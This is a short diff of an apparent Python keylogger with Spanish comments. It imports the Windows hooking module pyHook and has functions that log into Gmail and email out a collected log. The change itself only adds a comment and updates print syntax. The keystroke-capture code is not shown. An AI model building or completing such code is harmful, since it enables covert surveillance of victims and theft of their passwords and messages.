@@ -1,4 +1,4 @@
-import pyHook, pythomcom, sys, logging
+import pyHook, pythomcom, sys, logging #necesitas usar Windows para usar el modulo pyHook
 import time, datetime
 
 wait_seconds = 60
@@ -33,9 +33,9 @@ def SendEmail(user, pwd, recipient, subject, body):
         server.login(gmail, gmail_passpwd)
         server.sendmail(FROM, TO, message)
         server.close()
-        print "Correo enviado satisfactoriamente!"
+        print ("Correo enviado satisfactoriamente!")
     except:
-        print 'Error al mandar correo!'
+        print ("Error al mandar correo!")
 
 
 def FormatAndSendLogEmail():
